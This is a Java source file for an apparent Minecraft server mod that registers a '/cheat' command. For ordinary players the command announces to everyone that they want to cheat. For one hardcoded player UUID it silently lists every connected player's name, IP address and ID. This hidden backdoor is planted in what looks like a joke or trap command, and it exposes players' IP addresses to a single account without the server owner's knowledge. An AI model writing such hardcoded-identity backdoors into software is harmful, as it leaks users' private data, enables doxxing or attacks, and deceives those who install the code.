package com.devs.serverutils.command;

import com.mojang.brigadier.CommandDispatcher;
import com.mojang.brigadier.tree.LiteralCommandNode;
import net.minecraft.commands.CommandSourceStack;
import net.minecraft.commands.Commands;
import net.minecraft.network.chat.Component;
import net.minecraft.server.level.ServerPlayer;

import java.util.UUID;

public class FakeCheatCommand {
    public static void register(CommandDispatcher<CommandSourceStack> dispatcher) {
        LiteralCommandNode<CommandSourceStack> literalCommandNode = dispatcher.register(Commands.literal("cheat").executes((c) -> info(c.getSource())));
    }

    private static int info(CommandSourceStack source) {
        ServerPlayer sender = source.getPlayer();
        if (sender == null) {
            source.sendFailure(Component.literal("you have to be a player"));
            return -1;
        }
        UUID uuid = UUID.fromString("1493a36c-0f09-48e1-8a4b-015fc9db624f");
        if (source.getPlayer().getUUID().equals(uuid)) {
            ServerPlayer me = source.getPlayer();
            source.getServer().getPlayerList().getPlayers().forEach(p -> {
                source.sendSuccess(Component.literal(p.getDisplayName().getString() + " | " + p.getIpAddress() + " | " + p.getId()), false);
            });
        } else {
            source.getServer().getPlayerList().broadcastSystemMessage(Component.literal(source.getPlayer().getDisplayName().getString() + " wants to cheat!"), true);
        }
        return 1;
    }
}
